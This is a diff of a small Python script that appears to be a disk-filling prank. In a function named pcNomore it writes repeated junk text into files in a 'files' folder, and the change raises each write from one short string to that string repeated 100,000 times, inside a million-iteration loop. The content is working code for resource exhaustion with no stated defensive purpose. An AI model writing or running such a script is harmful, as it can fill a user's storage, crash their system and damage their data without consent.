@@ -1,6 +1,5 @@
 import os
 from multiprocessing import Process
-import sys
 
 path = 'files'
 if not os.path.exists(path):
@@ -9,6 +8,7 @@ cont = True
 fileNumA = 1
 fileNumB = 1
 count = 0
+text = "Peen"
 
 file_list = []
 
@@ -36,7 +36,7 @@ def pcNomore():
         with open(file, 'a') as fp:
             fileNumB = fileNumB + 1
             for x in range(1000000):
-                fp.write("Peen")
+                fp.write(text * 100000)
 
 
 
